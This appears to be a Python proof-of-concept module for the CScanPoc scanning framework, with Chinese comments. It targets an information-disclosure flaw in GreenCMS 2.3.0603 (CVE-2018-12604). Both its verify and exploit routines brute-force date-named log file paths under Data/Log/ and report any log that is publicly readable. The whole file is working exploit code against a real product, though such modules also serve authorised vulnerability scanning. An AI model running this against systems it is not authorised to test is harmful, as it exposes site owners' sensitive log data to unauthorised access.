# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import datetime


class Vuln(ABVuln):
    vuln_id = 'GreenCMS_0006'  # 平台漏洞编号
    name = 'GreenCMS信息泄露'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2018-06-21'  # 漏洞公布时间
    desc = '''
        GreenCMS是一套基于ThinkPHP开发的内容管理系统（CMS）。   GreenCMS 2.3.0603版本中存在安全漏洞。远程攻击者可通过对Data/Log/year_month_day.log文件发送直接请求利用该漏洞获取敏感信息
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-11913'
    cnvd_id = 'CNVD-2018-11913'  # cnvd漏洞编号
    cve_id = 'CVE-2018-12604'  # cve编号
    product = 'GreenCMS'  # 漏洞组件名称
    product_version = '2.3.0603'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9e82f013-0404-4dcb-bd09-4d17921a1341'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            start = '2018-01-01'
            end = '2018-12-31'
            datestart = datetime.datetime.strptime(start, '%Y-%m-%d')
            dateend = datetime.datetime.strptime(end, '%Y-%m-%d')

            while datestart < dateend:
                datestart += datetime.timedelta(days=1)
                payload = datestart.strftime('%Y_%m_%d')[2:10]

                self.output.info('正在生成日志爆破字典')
                vul_url = arg + '/Data/Log/'+payload+'.log'
                response = requests.get(vul_url)
                if response.status_code == 200 and 'INFO:' in response.text:
                    self.output.info('字典爆破成功')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                    break

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)

            start = '2018-01-01'
            end = '2018-12-31'
            datestart = datetime.datetime.strptime(start, '%Y-%m-%d')
            dateend = datetime.datetime.strptime(end, '%Y-%m-%d')

            while datestart < dateend:
                datestart += datetime.timedelta(days=1)
                payload = datestart.strftime('%Y_%m_%d')[2:10]

                vul_url = arg + '/Data/Log/'+payload+'.log'
                response = requests.get(vul_url)
                if response.status_code == 200 and 'INFO:' in response.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取的漏洞url地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=vul_url))
                    break
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
